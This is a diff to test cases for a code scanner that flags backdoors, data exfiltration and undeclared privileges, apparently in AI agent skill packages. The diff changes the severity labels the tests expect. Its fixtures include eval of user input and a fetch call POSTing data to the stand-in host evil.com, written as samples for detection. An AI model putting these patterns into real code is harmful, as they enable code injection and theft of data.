@@ -69,7 +69,7 @@ describe("backdoor", () => {
     const file = makeFile("evil.js", `const result = eval(userInput);`);
     const findings = backdoorRule.run([file]);
     assert.ok(findings.length > 0);
-    assert.equal(findings[0]!.severity, "critical");
+    assert.equal(findings[0]!.severity, "high");
   });
 
   it("detects new Function()", () => {
@@ -126,7 +126,7 @@ describe("data-exfil", () => {
       `fetch("https://evil.com", { method: "POST", body: data });`,
     ].join("\n"));
     const findings = dataExfilRule.run([file]);
-    assert.ok(findings.some((f) => f.severity === "critical"));
+    assert.ok(findings.some((f) => f.severity === "high"));
   });
 
   it("detects dynamic URL in fetch", () => {
@@ -138,13 +138,13 @@ describe("data-exfil", () => {
   it("does NOT flag file read without HTTP", () => {
     const file = makeFile("reader.ts", `const data = fs.readFileSync("config.json");`);
     const findings = dataExfilRule.run([file]);
-    assert.equal(findings.filter((f) => f.severity === "critical").length, 0);
+    assert.equal(findings.filter((f) => f.severity === "high").length, 0);
   });
 
   it("does NOT flag HTTP without sensitive read", () => {
     const file = makeFile("api.ts", `fetch("https://api.example.com/data");`);
     const findings = dataExfilRule.run([file]);
-    assert.equal(findings.filter((f) => f.severity === "critical").length, 0);
+    assert.equal(findings.filter((f) => f.severity === "high").length, 0);
   });
 });
 
@@ -163,13 +163,13 @@ describe("privilege", () => {
     ].join("\n"));
     const code = makeFile("index.ts", `import { exec } from "child_process";\nexec("ls");`);
     const findings = privilegeRule.run([skillMd, code]);
-    assert.ok(findings.some((f) => f.severity === "warning" && f.message.includes("exec")));
+    assert.ok(findings.some((f) => f.severity === "low" && f.message.includes("exec")));
   });
 
   it("reports info when no SKILL.md", () => {
     const code = makeFile("index.ts", `console.log("hello");`);
     const findings = privilegeRule.run([code]);
-    assert.ok(findings.some((f) => f.severity === "info" && f.message.includes("SKILL.md")));
+    assert.ok(findings.some((f) => f.severity === "low" && f.message.includes("SKILL.md")));
   });
 
   it("does NOT flag declared permissions", () => {
@@ -182,7 +182,7 @@ describe("privilege", () => {
     ].join("\n"));
     const code = makeFile("index.ts", `import { exec } from "child_process";\nexec("ls");`);
     const findings = privilegeRule.run([skillMd, code]);
-    assert.ok(!findings.some((f) => f.severity === "warning" && f.message.includes("exec")));
+    assert.ok(!findings.some((f) => f.severity === "low" && f.message.includes("undeclared")));
   });
 });
 
